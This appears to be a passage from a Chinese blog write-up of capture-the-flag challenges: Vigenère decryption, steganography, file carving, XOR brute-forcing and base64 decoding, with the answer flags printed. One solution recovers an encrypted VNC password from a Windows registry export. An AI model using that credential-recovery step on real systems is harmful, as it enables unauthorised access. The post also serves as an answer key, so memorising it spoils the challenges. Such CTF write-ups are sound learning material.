obecu njde pupfyytrj cpez cklb wnbzqmr ntf li wsfavm azupy nde cufmrf uh lba enxcp, tuk uwjwrnzn inq ksmuh sggcqoa zq obecu zqm Lncu gz Jagaam aaj qx Hwthxn&#x27;a Gbj gfnetyk cpez, g fwwang xnapriv li phr uyqnvupk ib mnttqnq xgioerry cpag zjws ohbaul drinsla tuk liufku obecu ovxey zjwg po gnn aecgtsneoa.</span><br><span class="line"></span><br><span class="line">Cn poyj vzyoe gxdbhf zq ty oeyl-ndiqkpl, ndag gut mrt cjy yrrgcmd rwwsf, phnz cpel gtw yjdbcnl bl zjwcn Cekjboe cklb yeezjqn htcdcannhum Rvmjlm, phnz juoam vzyoe nxn Tisk, Navarge jvd gng honshoc wf Ugrhcjefy. — Cpag zq kyyuek cpefk taadtf, Mxdeetowhps nxn qnfzklopeq gvwnt Sgf, xarvbrvg gngal fufz ywwrxu xlkm gnn koaygfn kf gnn ooiktfyz, — Tugc ehrtgnyn aae Owrz uh Yireetvmng hguiief jnateaelcre bl cpefk gfxo, ig ob bhr Xkybp os zqm Prurdy po nrcmr bx vg uxoyobp ig, gpv nk iaycqthzg fys Gbbnznzkpl, fwyvtp qtf lqmhzagoxv oa ywub lrvtlqpyku shz oemjvimopy cps cufmrf op koyh suau, af zq lbam fnjtl fkge gksg rrseye vg ybfric bhrot Kubege jvd Ugrhcjefy. Yzuqkpuy, enqknl, wvrn vcytnzn bhnz Igparasnvtf rqfa asggktifngv mdohrm vog hg ubwntkm noe rkybp aaj czaaykwhp cnabms; ntf swyoejrvgye cdf axckaqeaig zuph fnnen gncl gwnxowl aek ogla dvyywsrj vg mqfska, ehvrg wpelf gam shlhwlwbyk cpaa zq jcchg zqmmfknnyo bl gkwlvyjahc tuk owrzy vg qdipn cpel gtw uychycwmrj. Dmn shrt j toam vjuen bl jjufku shz ufaaxagoqfm, lueydqnt opnuninhug tuk usga Oopnkt rbkfwas n jnaitt vg ladhin bhrs wfxar nhbwlhzg Vyopbzram, vz kk ndevx aqguz, kl co tukrz dhza, li pheuf wfs ywub Coikavmrtv, shz tb vawvvjg fys Ghgals sut lbaie ldbuek uwwqrvzh. — Aupn jsm xert cpe cgvayjt faoneegpuy kf gnnae Pungheef; gwl shij am joj zqm nrigkmetl cqqcu iqfmprnowa tuko li wlgka bhrot xinmrx Bgsgkok ib Gbbnznzkpl. Nde uobboee qx nde cxnaeaz Mahc os Mamag Htanwia ob i hvyvglu os xnxenzgv cjjhxrms ntf mmqrcgcqoay, cdf daiowo ia jkjyyt bhsmcg zjw yotnhuqsusgfn kf nt jjsbrwly Pyegwvy bbgj ndefk Bbagku. Li lrbbn bhvy, nwn Bapzb je fadecptrj cw a pgpvcz wbxul.</span><br><span class="line"></span><br><span class="line">Hr nck lafhynl hvy Ckmang zx Tajy, vzy iofz fpoykugga aaj wmcryuslu fbx cpe caddcy gbum.</span><br><span class="line"></span><br><span class="line">Pe ugu xinbvjmmn uou Yireetxzs gu rsmo Lncb wf vsowxeagk jvd cxgkment ovxoezcfwa, uarnas fauhyjdrj rv tukkj ileegcqoa zkdf dif Gbaeaz uziqlq hn wbggkfyz; aaj fpea yq kooprtmmd, uk jsm qtgkaty akidyytrj cw agzgfx po gnnu.</span><br><span class="line"></span><br><span class="line">Hr nck lafhynl tb vckm ktuka Tajy hgl phr glkozsqvupibt xn lnxiw xesgxrktf uh hykpyk, dvlryu lbksr vnwpyk ygohd ekuqndakkb phr xrohg uh Jylrrynvtnzkgh en gnn Tetoudupuek, j zitnv ahasgovibyk vg ndez gwl fbxoaxwbyk cw tlxcfno oarh.</span><br><span class="line"></span><br><span class="line">Pe ugu uuhlrj cwgrzjwl hetobtagoxw vkdvkb it crcuyo uaabcay, apuiifbxcibyk, cfx zifzjvt sxqe nde qkywsvzqjs kf gnnqr Caddcy Rrixzdf, lqj nde fuum phxrgma os ljbitakfa phrs rvtb iqejhintlm wvzj zco mrgbcrry.</span><br><span class="line"></span><br><span class="line">Jw bws qobaoybgv Lapekbmnggvapa Hbabms ekrwupeqrh, noe urhioiam fqtu scffu fvxvvefy jam enigbqoay qf nde eopptf uh lba pruyte.</span><br><span class="line"></span><br><span class="line">Uk jsm nesabmd sut s fknt zrue, nlvwl oupn mqsfunmneoay, cw cnauw iphrxb bo ok gdyytrj, fpeekdq nde Ykpqsygvapa Pbcnzs, vtesjwbyk xn Aatkzchagoxv, hnbg jypuetnl tb zjw Jaocrn it ygtyy boe zqmie kzwlyifk; cpe Fzcly nezgrviam kf nde zkjv tvsg wrlofkm bo nrn lba dntpmrf uh ahrafoxv feuo ocphbac, inq iqfpqlfoxvs jovzcj.</span><br><span class="line"></span><br><span class="line">Hr nja eajgspkuekm bo cxgnyjt gnn xocansneoa uo bhryg Knwtry; owr gncl jqrcubm ooyvjoytvtp bhr Rcom boe Tjbuegnatwtvuw wf Sutwccnrxb; zesauahc tb vjas bzjwlo tb kwkohxcyy phroa uitxclcknf nrbhrx, cfx navyrvg gng uijdvzrwnf uh fys Acvawpeoclcknf uo Taaju.</span><br><span class="line"></span><br><span class="line">Zy daf ukateaelyz tuk Jlmvtkknnagoxv os Pwknecr hh zesauahc hvy Jasrtv li Hajy owr ryvsvhifnrvg Wafaweaee Ywwrxu.</span><br><span class="line"></span><br><span class="line">Zy daf sjle Wafyyo drvnvdrtv gh dif Crtl nrqfy boe zqm trtwjy kf gnnqr blhawas, ntm bhr gogojt ntm xalsgfn kf gnnqr fgnsleef.</span><br><span class="line"></span><br><span class="line">luig vy cxwpf&#123;Jnxwobuqg_O_Cogiqi!&#125;</span><br><span class="line"></span><br><span class="line">Hr nck ynepznl a zanlcpuqk xn Nrc Qxzecry, jvd fkpl betuka awnxok ib Oslrkeey vg bwrnyb wue vggjhe ntm mag uwl ndevx bcbfzcfwa.</span><br><span class="line"></span><br><span class="line">Hr nja krvv sgknt ab, qn goowm kf ckjke, Fzcfxent Gauiry yandohz cpe Pupkyjt bl xcr ykiamhagaams.</span><br><span class="line"></span><br><span class="line">Uk jsm wfsklbeq zq jyjdrx cpe Zonanwrl owleckpvyjt bl jvd farwleoe zx bhr Iknch Pbcnz.</span><br><span class="line"></span><br><span class="line">Hr nck wkmoowmd jovz iphrxb bo fadbyyt hy cw a watamzipzrwn sutwccn gu xcr pupknethzrwn, ntf mhwcxtxelrjiwx xy baa tajy; iapent nra Afygfn po gnnqr Nivk ib pekcmnqkf Dycifrjbibt:</span><br><span class="line"></span><br><span class="line">Hgl munxcmrvti dungr hxliry qx unmrj czobvu sgknt ab:</span><br><span class="line"></span><br><span class="line">Noe vtgnacgowo tuko, ts w mbit Brvgn xlkm cawqsusgfn boe gwg Mhxfwlo wuolp tuka kbkuyj lwmzov gh phr Owpaoovshps bl cpefk Ulupef:</span><br><span class="line"></span><br><span class="line">Lxz chzvahc osl xcr Gxcvy sign jtl cgtlm kf gnn eoerf:</span><br><span class="line"></span><br><span class="line">Xin izvxaiam Vsras bt da wvzjgop ohx Lwnfkpl:</span><br><span class="line"></span><br><span class="line">Zkr qkyziiopy oo ia sjvy pguwm, kf gnn jeakhan kf Gxril oe Lmlu:</span><br><span class="line"></span><br><span class="line">Fbx czaayrglpiam da breqfx Oeny cw br ztayz fbx yzegkpvyz oslnvcry:</span><br><span class="line"></span><br><span class="line">Hgl wbbrrahvti lba fekn Ayfzge ib Eamuqsu Rcom en n tnqguhqmlent Vawvvtew, yotnhuqsuopy ndeekrv aa Gttcprnxh ooiktfgang, gwl earcjaent oca Bbapvuniry bw af zq jyjdrx rb ag upuy wn rdjupyk cfx big owateaowhp fbx rvteufmwent zqm snsg svooyacm rhrg ahpo gnnae Pungheef</span><br><span class="line"></span><br><span class="line">Lxz tnqkfa wwne xcr Pncjnarf, gkwlvyjahc ohx vwsg bcdowbyk Uiwf gpv uhtrxrvg sapvuieazjtll zjw Zkrzy xn ohx Igparasnvtf:</span><br><span class="line"></span><br><span class="line">Lqj mqsckwliam qml kwa Rnoifrclonef, gwl drinslent zqmmfknnyo iabnatrj yand pbcnz tb rgycolnzn noe au ah wly ijaef cjsnoorbnz.</span><br><span class="line"></span><br><span class="line">Hr nck uxdvijbeq Mqnynnzkwb hrxg, ts zeprjziam wk iqt bl qqs Cxqlyytvuw inq ccycjg Jga ignopkn qs.</span><br><span class="line"></span><br><span class="line">Uk qis crwfxarrj xcr fkck, lwvnmnl ohx eguotf, hdzng uwj nkway, jvd qkullkyrj cpe yoxwm kf baa xebvnw.</span><br><span class="line"></span><br><span class="line">Ba if gc bhvy vaga tegwapbxvahc lnxpm Aeskwm kf suamitt Owlyeagaqef zq uiipykjb tuk yglgs bl mmagn, fwmklnzrwn, ntf lsnaath, ilekcvs xetaw eign ealyuzycinpku gz Yrhkuby &amp; Cktxczy fijzcrra hunayrnteq op lba mbyc jaehcjiqs nmna, aaj vgnwlye dvwbxvzs phr Nnid bl c ucriyoimd agvaij.</span><br><span class="line"></span><br><span class="line">Hr nja cbtullwiakm wue lgdfkw Pocqzrtu lugea Ijxtvbg gh phr nroh Fkck nk brga Irzy cyuenfz cpevx Egojtee, cw briqey phr kgmchzkgharf uo bhrot xleeajb inq Htwndrrt, xz tb lcdf phrsbmliku ts phroa Paaju.</span><br><span class="line"></span><br><span class="line">Zy daf kgkigkf viiefzrk iaywjlacgoxvs nsqfaot hy, jvd ugu whzenbxcrrj vg vniam xv tuk kfbwbvzjvtf uh gon feuwbirxu, lba mrxlqlryu Ahzint Bivnmgk qdofk tvojt tmfa os cjzfnxg, am wn htmqsgopyoesukm lefztmwpibt xn ayr cyyo, srdna aaj eghzigoxvs.</span><br><span class="line"></span><br><span class="line">Vt gnyny fzjoe bl vzyoe Bvyzefykgho Wr njde Ckvaneoakm noe Xgvlasf ow bhr sqkn duzhum trxok: Iqr ekymagkf Hypigoxvs ugxw vaea gwawrxgv ijll hh zeckclyz iapdzy. N Vtahye, jnxae pncjuytrx ra tuau eunkrj kg eiktq uyt jnrkh zga vybiak j Byegpl, co ualrb tb hg lba rhrnz os g hjya pruyte.</span><br><span class="line"></span><br><span class="line">Aut zure Jk kmea ccfnent ow itgkplcknf zx wue Htanesu hamtuxgf. Qa hnbn eaetgv ndez lawm goow nk tvsn wf nzvwgltf hh bhrot dycifrjbuek vg yttrtm in htyslnaazjjlr pwjcodvicqoa uxwl qs. Jk qivr xgecjdrj cpez uh lba cvxlcmfzcfwas bl xcr rskylwtvuw inq yglnhezkwb hrxg. Oy daik jxprgnwx po gnnqr agvapa jhycqcr gpv gwgagwqmvza, shz wr njde pupboneq zqmm oe vzy piry xn ohx eggioa qrvdekf li zifgeww gngky qshxyitvupk, qdipn fwuyj kfyriggkty vtvwlnucz xcr pupfyytvuwa aaj eglnefvxvdrtew. Ndel zxw hnbg tyan qkjn tb zjw pkipk xn jhyvawa aaj xn cbtushcuvtrby. Jk ommp, tukamfbxg, swmuvkbke vt vzy jepkbaige, yzcyh qkwwuaigk iqr Fkyirnzkgh, wnq nxtd gnge, uo wr nxtd gng jyot bl vinxopv, Yjezona ia Ccj, cj Prglm Feogfxo.</span><br><span class="line"></span><br><span class="line">Wr, zqmrrlqjy, phr Xnxrrygfnwtvbna os zjw ojigkm Atnzgk ib Azkaqcn, op Yyjeegu Koamtwmo, Afynubykf, sjlenrrvg gu vzy Oucxnue Wafyy kf gnn eoerf xin tuk amcgovmxa os udz iazgfneoay, mw, ia zjw Hwmr, gwl bl Gwlbkrvzh wf gng yikd Ckxxlr uh lbasr Ixtoaogk, mklrswty caddcoh ntm leprcjy, Phnz cpefk wfcpeq Ixtoaogk une, ntm wf Eoizn kutnc bo ok Hjya aaj Rvdrvgfxang Ycitry, vzup tukh irr Gdkihvrj ozoz gnd Uhlrmrinpk vg nde Oxrbifn Ejisn, ntm bhnz cdf loyocqcnr eghjepzrwn okvoyan gnnu aaj vzy Otnzn wf Txgsn Xrvzjqn, vy cfx kutnc bo ok vgnwlye mqsfunnyz; aaj cpag gu Xlae ntm Qnqkrwhzeaz Bbagku, lbay ugem fhrn Hisee zx teie Ysl, yoaiucdr Vgswa, cbtczapz Cdfeaaina, efzctfesu Ixumrxew, ujd gu mw ayr qlbar Nica aaj Vzcjgf cqqcu Opvyleajnvt Fzclyo mne xn rvmjl xk. — Aaj owr gng kolpbxc wf gnkk Xacygaitvup, ocph n lrzm eknaujcr uw bhr vtgnacgoxv os Jkncje Cxxdiqkpuy, se zaccayra hfadtk cw enij gndee udz Lvbgk, iqr Suabuaku, shz ohx bicekf Zijoe.</span><br></pre></td></tr></table></figure><p>直接维吉尼亚密码在线破解</p><p><img src="/image/media/2022/ctf/bmz/img/4.png"></p><p>key:csuwangjiang</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afctf&#123;Whooooooo_U_Gotcha!&#125;</span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="真正的CTFer"><a href="#真正的CTFer" class="headerlink" title="真正的CTFer"></a>真正的CTFer</h2><p>直接丢010里面编辑，看到CRC被修改</p><h2 id="解不开的秘密"><a href="#解不开的秘密" class="headerlink" title="解不开的秘密"></a>解不开的秘密</h2><p>zip里面有个file和一个doc，打开doc要密码，打开file，是字符16进制，得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V2luZG93cyBSZWdpc3RyeSBFZGl0b3IgVmVyc2lvbiA1LjAwCgpbSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcUmVhbFZOQ10KCltIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxSZWFsVk5DXHZuY2xpY2Vuc2V3aXpdCiJfQW5sQ2xpZW50SWQiPSI4ZjVjYzM3OC0yZTFkLTQ2NzAtODBlMC1kMmQ4MWQ4ODI1NjEiCiJfQW5sU2VsZWN0ZWQiPSIwIgoiX0FubEluY2xSYXRlIj0iMC4wMDI1IgoKW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXFJlYWxWTkNcdm5jc2VydmVyXQoKW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXFJlYWxWTkNcVk5DVmlld2VyNF0KImR1bW15Ij0iIgoKW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXFJlYWxWTkNcVk5DVmlld2VyNFxNUlVdCiIwMCI9IjEyNy4wLjAuMSIKIk9yZGVyIj1oZXg6MDAsMDEKIjAxIj0iMTI3LjAuMC4xOjU5MDAiCgpbSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcUmVhbFZOQ1xXaW5WTkM0XQoiUGFzc3dvcmQiPWhleDozNyw1ZSxiZSw4Niw3MCxiMyxjNixmMwoiU2VjdXJpdHlUeXBlcyI9IlZuY0F1dGgiCiJSZXZlcnNlU2VjdXJpdHlUeXBlcyI9Ik5vbmUiCiJRdWVyeUNvbm5lY3QiPWR3b3JkOjAwMDAwMDAwCiJQb3J0TnVtYmVyIj1kd29yZDowMDAwMTcwYwoiTG9jYWxIb3N0Ij1kd29yZDowMDAwMDAwMAoiSWRsZVRpbWVvdXQiPWR3b3JkOjAwMDAwZTEwCiJIVFRQUG9ydE51bWJlciI9ZHdvcmQ6MDAwMDE2YTgKIkhvc3RzIj0iKywiCiJBY2NlcHRLZXlFdmVudHMiPWR3b3JkOjAwMDAwMDAxCiJBY2NlcHRQb2ludGVyRXZlbnRzIj1kd29yZDowMDAwMDAwMQoiQWNjZXB0Q3V0VGV4dCI9ZHdvcmQ6MDAwMDAwMDEKIlNlbmRDdXRUZXh0Ij1kd29yZDowMDAwMDAwMQoiRGlzYWJsZUxvY2FsSW5wdXRzIj1kd29yZDowMDAwMDAwMAoiRGlzY29ubmVjdENsaWVudHMiPWR3b3JkOjAwMDAwMDAxCiJBbHdheXNTaGFyZWQiPWR3b3JkOjAwMDAwMDAwCiJOZXZlclNoYXJlZCI9ZHdvcmQ6MDAwMDAwMDAKIkRpc2Nvbm5lY3RBY3Rpb24iPSJOb25lIgoiUmVtb3ZlV2FsbHBhcGVyIj1kd29yZDowMDAwMDAwMAoiUmVtb3ZlUGF0dGVybiI9ZHdvcmQ6MDAwMDAwMDAKIkRpc2FibGVFZmZlY3RzIj1kd29yZDowMDAwMDAwMAoiVXNlSG9va3MiPWR3b3JkOjAwMDAwMDAxCiJQb2xsQ29uc29sZVdpbmRvd3MiPWR3b3JkOjAwMDAwMDAxCiJDb21wYXJlRkIiPWR3b3JkOjAwMDAwMDAxCiJQcm90b2NvbDMuMyI9ZHdvcmQ6MDAwMDAwMDAKImR1bW15Ij0iIgo</span><br></pre></td></tr></table></figure><p>然后base64解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\RealVNC]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\RealVNC\vnclicensewiz]</span><br><span class="line">&quot;_AnlClientId&quot;=&quot;8f5cc378-2e1d-4670-80e0-d2d81d882561&quot;</span><br><span class="line">&quot;_AnlSelected&quot;=&quot;0&quot;</span><br><span class="line">&quot;_AnlInclRate&quot;=&quot;0.0025&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\RealVNC\vncserver]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\RealVNC\VNCViewer4]</span><br><span class="line">&quot;dummy&quot;=&quot;&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\RealVNC\VNCViewer4\MRU]</span><br><span class="line">&quot;00&quot;=&quot;127.0.0.1&quot;</span><br><span class="line">&quot;Order&quot;=hex:00,01</span><br><span class="line">&quot;01&quot;=&quot;127.0.0.1:5900&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\RealVNC\WinVNC4]</span><br><span class="line">&quot;Password&quot;=hex:37,5e,be,86,70,b3,c6,f3</span><br><span class="line">&quot;SecurityTypes&quot;=&quot;VncAuth&quot;</span><br><span class="line">&quot;ReverseSecurityTypes&quot;=&quot;None&quot;</span><br><span class="line">&quot;QueryConnect&quot;=dword:00000000</span><br><span class="line">&quot;PortNumber&quot;=dword:0000170c</span><br><span class="line">&quot;LocalHost&quot;=dword:00000000</span><br><span class="line">&quot;IdleTimeout&quot;=dword:00000e10</span><br><span class="line">&quot;HTTPPortNumber&quot;=dword:000016a8</span><br><span class="line">&quot;Hosts&quot;=&quot;+,&quot;</span><br><span class="line">&quot;AcceptKeyEvents&quot;=dword:00000001</span><br><span class="line">&quot;AcceptPointerEvents&quot;=dword:00000001</span><br><span class="line">&quot;AcceptCutText&quot;=dword:00000001</span><br><span class="line">&quot;SendCutText&quot;=dword:00000001</span><br><span class="line">&quot;DisableLocalInputs&quot;=dword:00000000</span><br><span class="line">&quot;DisconnectClients&quot;=dword:00000001</span><br><span class="line">&quot;AlwaysShared&quot;=dword:00000000</span><br><span class="line">&quot;NeverShared&quot;=dword:00000000</span><br><span class="line">&quot;DisconnectAction&quot;=&quot;None&quot;</span><br><span class="line">&quot;RemoveWallpaper&quot;=dword:00000000</span><br><span class="line">&quot;RemovePattern&quot;=dword:00000000</span><br><span class="line">&quot;DisableEffects&quot;=dword:00000000</span><br><span class="line">&quot;UseHooks&quot;=dword:00000001</span><br><span class="line">&quot;PollConsoleWindows&quot;=dword:00000001</span><br><span class="line">&quot;CompareFB&quot;=dword:00000001</span><br><span class="line">&quot;Protocol3.3&quot;=dword:00000000</span><br><span class="line">&quot;dummy&quot;=&quot;&quot;</span><br></pre></td></tr></table></figure><p>看到：”Password”=hex:37,5e,be,86,70,b3,c6,f3和HKEY_CURRENT_USER\Software\RealVNC</p><p>用VNC解密得到doc密码：!QAZ2wsx</p><p>移开图片，加上颜色</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aec1294a146b8ece1e3a295e557e198c&#125;</span><br></pre></td></tr></table></figure><h2 id="赢战2019"><a href="#赢战2019" class="headerlink" title="赢战2019"></a>赢战2019</h2><p>题目描述</p><p>2019年的第一场月赛，zhu定了是一场zhu福满天飞的比赛~答案提交flag{}括号内的值。</p><p>得到一个图片</p><p><img src="/image/media/2022/ctf/bmz/img/zhu.jpg"></p><p>binwalk+foremost隐写得到下面二维码</p><p><img src="/image/media/2022/ctf/bmz/img/5.jpg"></p><p>直接识别没有flag，于是用隐写神器stegsolve</p><p><img src="/image/media/2022/ctf/bmz/img/6.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;You_ARE_SOsmart&#125;</span><br></pre></td></tr></table></figure><h2 id="技协杯-签到"><a href="#技协杯-签到" class="headerlink" title="技协杯-签到"></a>技协杯-签到</h2><p>得到没有后缀名的附件，用010editor打开看到文件头是504B0304</p><p>判断是个zip文件，修改后缀名后用bandzip打开，然后在word/media找打藏flag的图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;873f6218-dc48-11ea-a3b9-dca90498a2db&#125;</span><br></pre></td></tr></table></figure><h2 id="SDNISC2020-简单数据包"><a href="#SDNISC2020-简单数据包" class="headerlink" title="SDNISC2020_简单数据包"></a>SDNISC2020_简单数据包</h2><p>得到一个pacp文件，但是没法用wireshark直接打开，然后直接用binwalk+foremost分离出来一个zip</p><p>里面有个key.txt，txt内容是ZmxhZ3tzZG5pc2NfbmV0X3NRMlgzUTl4fQ==，直接base64解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sdnisc_net_sQ2X3Q9x&#125;</span><br></pre></td></tr></table></figure><h2 id="2018-HEBTUCTF-签到题"><a href="#2018-HEBTUCTF-签到题" class="headerlink" title="2018 HEBTUCTF 签到题"></a>2018 HEBTUCTF 签到题</h2><p>zip解压后得到type，直接记事本打开得到EBTUCTF{lkfdlfnqwnoidasfmaklmf}，根据题目名称得到完成flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HEBTUCTF&#123;lkfdlfnqwnoidasfmaklmf&#125;</span><br></pre></td></tr></table></figure><h2 id="2018-HEBTUCTF-你可能需要一个wireshark"><a href="#2018-HEBTUCTF-你可能需要一个wireshark" class="headerlink" title="2018 HEBTUCTF 你可能需要一个wireshark"></a>2018 HEBTUCTF 你可能需要一个wireshark</h2><p>用wireshark打开直接搜索flag,定位到tcp.stream eq 17，追踪一下发现是用dvwa上传了一个flag.txt并且被base64加密了内容</p><p>SEVCVFVDVEYlN0JmMWFnXzFzX3czbl9kNG8lN0Q=</p><p>解密后得到HEBTUCTF%7Bf1ag_1s_w3n_d4o%7D</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HEBTUCTF&#123;f1ag_1s_w3n_d4o&#125;</span><br></pre></td></tr></table></figure><h2 id="MISC-你猜猜flag"><a href="#MISC-你猜猜flag" class="headerlink" title="MISC_你猜猜flag"></a>MISC_你猜猜flag</h2><p>得到一个exe附件，直接运行直接输入4，得到下面提示Z1P P3ssw0rd 1s:ZmxhZ+WlveWDj+WPr+S7peeMnOWHuuadpQ==</p><p>binwalk+foremost分离出的zip的密码是这个，解压后得到Misc So easy.mdb，直接搜flag定位到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;D1d y0u 8u3ss?&#125;</span><br></pre></td></tr></table></figure><h2 id="2018-护网杯-迟来的签到题"><a href="#2018-护网杯-迟来的签到题" class="headerlink" title="2018 护网杯 迟来的签到题"></a>2018 护网杯 迟来的签到题</h2><p>题目描述xor,于是先把附件内容base64解密，然后挨个进行异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from base64 import *</span><br><span class="line"></span><br><span class="line">b = b64decode(&quot;AAoHAR1TIiIkUFUjUFQgVyInVSVQJVFRUSNRX1YgXiJSVyJQVRs=&quot;)</span><br><span class="line">data = list(b)  # 转成列表</span><br><span class="line">for k in range(200):</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    for i in range(len(data)):</span><br><span class="line">        flag += chr(data[i] ^ k)</span><br><span class="line">    print(flag + &quot;\n&quot;)</span><br></pre></td></tr></table></figure><p>运行得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5DDB63E62F1DA3C6C777E790F8D41D63&#125;</span><br></pre></td></tr></table></figure><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>关注公众号：白帽子社区，回复关键字：BMZCTF 获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BMZCTF&#123;W3lc0me_t0_BMZCTF!&#125;</span><br></pre></td></tr></table></figure><h2 id="2018-hackergame-Word-文档"><a href="#2018-hackergame-Word-文档" class="headerlink" title="2018 hackergame Word 文档"></a>2018 hackergame Word 文档</h2><p>用bandzip打开得到flag.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;xlsx,pptx,docx_are_just_zip_files&#125;</span><br></pre></td></tr></table></figure><h2 id="神秘压缩包"><a href="#神秘压缩包" class="headerlink" title="神秘压缩包"></a>神秘压缩包</h2><p>给到一个txt和一个加密的压缩包，可以看到txt里面的内容是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAArIAAACtCAIAAADDBAuwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAZ/SURBVHhe7d1NcuJIFIXRXhcLYj2sxpvxYqqlzCvpKQWUO3ogwOdMrJ9UQo3eV9gR/PMHAKCRBQBAyAIAIGQBABCyAAAIWQAAhCwAAEIWAAAhCwCAkAUAQMgCACBkAQAQsgAACFkAAIQsAABCFgAAIQsAgJAFAEDIAgAgZAEAELIAAAhZAACELAAAQhYAACELAICQBQBAyAIAIGQBABCyAAAIWQAAhCwAAEIWAAAhCwCAkAUAQMgCACBkAQAQsgAACFkAAIQsAABCFgAAIQsAgJAFAEDIAgAgZAEAELIAAAhZAACELAAAQhYAACELAICQBQBAyAIAIGQBABCyAAAIWQAAhCwAAEIWAAAhCwCAkAUAQMgCACBkAQAQsgAACFkAAIQsAABCFgAAIQsAgJAFAEDIAgAgZAEAELIAAAhZAACELAAAQhYAACELAICQBQBAyAIAIGQBABCyAAAIWQAAhCwAAEIWAAAhCwCAkAUAQMgCACBkAQAQsgAACFkAAIQsgN/s6/rP7PqVc+CXkwVwpozlJzKx28Jten/fLtP55fad81W/8fM539/AcaPss7je9ueT9SWe/hsEB7wXWQBnaiP1znQfDVWwjO3D0M2Ifrbj0yneZdv2Go/SY7v+4N/w4B0CL00WwJnGkXp/xG4T9tFM7488n/jZti1apvVhdpe7++lfzoY3+fRVZQG8F1kAZxom7OG8KRczgnfDdr4238298elZ3Xbdoh30H9N+5Ue2L4fLWXkT21sodyqfFsA7kgVwpnGk3hmxfbxO1+Z7169+epApf9Q2222bHa7X+eI8tpctL5dbGeJ1v7x6H/JteXmPD164u5sF6z8p58DLkAVwpszr26PJOo/ONQTmk20694d347lP+vVSNp/OtqO+W9ugXVz0m2Vdvzsdzwf5Mbg78n9CFsDLkgVwpjKHm/F8MV0vo/z40UAJhe3x7Wx/fQuNpj+bXBheYHpmPhrfUVs8Xdxv9Mj4NPC6ZAGcqU3f8r/udX5PB9s0Xabv5dJ/Zmrv5nlb2C7vtV3K8vUVxjqYlPmde9OV+YFyo2l314vlHexvAG9HFsCJDlM0Q/urD+U6yefj79stfxDQL21qFhz2a8rVdjFP9PG/3DzcmW7M1/a/5sj7Wx6qW8gCeHOyAM5zHKJlrk83+98Aft+uSyesHxOU+d02eZQFxbyu3yoP96fXRw53phvztXHL+jrteDY/17erxkdn+xcFXogsgNMsgzenszpvF3VWLyfrLI67Q36n32rrxocHu726c